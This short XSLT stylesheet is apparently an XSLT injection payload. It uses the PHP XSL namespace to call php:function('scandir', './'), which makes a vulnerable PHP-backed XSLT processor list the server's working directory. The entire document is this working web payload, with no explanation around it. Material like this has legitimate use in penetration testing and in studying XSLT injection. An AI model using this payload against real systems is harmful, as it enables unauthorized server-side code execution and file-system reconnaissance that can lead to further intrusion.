<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
	<p><xsl:value-of name="assert" select="php:function('scandir', './')"/></p>
</body>
</html>
